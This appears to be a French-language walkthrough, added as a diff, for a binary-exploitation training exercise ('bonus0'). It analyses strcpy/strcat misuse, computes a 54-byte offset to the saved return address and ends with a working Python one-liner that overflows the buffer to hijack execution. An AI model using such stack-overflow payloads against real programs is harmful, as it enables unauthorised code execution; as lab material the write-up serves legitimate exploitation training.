@@ -1,0 +1,19 @@
+On peut remarquer dans le code un strcpy et un strcat, ce sont deux fonctions qui s'arretent de copier que lorsqu'il rencontre un '\0'. on peut remarquer que dans la fonction pp il n y a pas de leave, il remet la stack manuellement comme a l'etat initial(add    esp,0x50) puis des pops.
+Donc il impossible d'utiliser un overflow sur une adresse de cette stack.
+Les functions strcpy et strcat copie dans une adresse declaree dans le main !!! Donc on va overflow le EIP sauvgarde lors de l'arrivee dans le main. Tout d'abords nous devons calculer l'offset afin d'ecraser cette valeur.
+L'adresse ou on va ecricre est a l'adresse suivante : 0xbffff6d6
+L'adresse de sauvgarde de EIP est la suivante: 0xbffff70c
+	0xbffff70c - 0xbffff6d6 = 0x36 = 54
+
+dest1 	: string du premier p
+dest2 	: string du second p
+new	: string du main
+
+dest1 + 0x14 == dest2
+
+
+
+On doit comprendre comme new est cree.
+
+
+(python -c 'print "a"*25';python -c 'print "\x54"*15 + "\xf9\xff\xbfA"' ;cat -) | ./bonus0
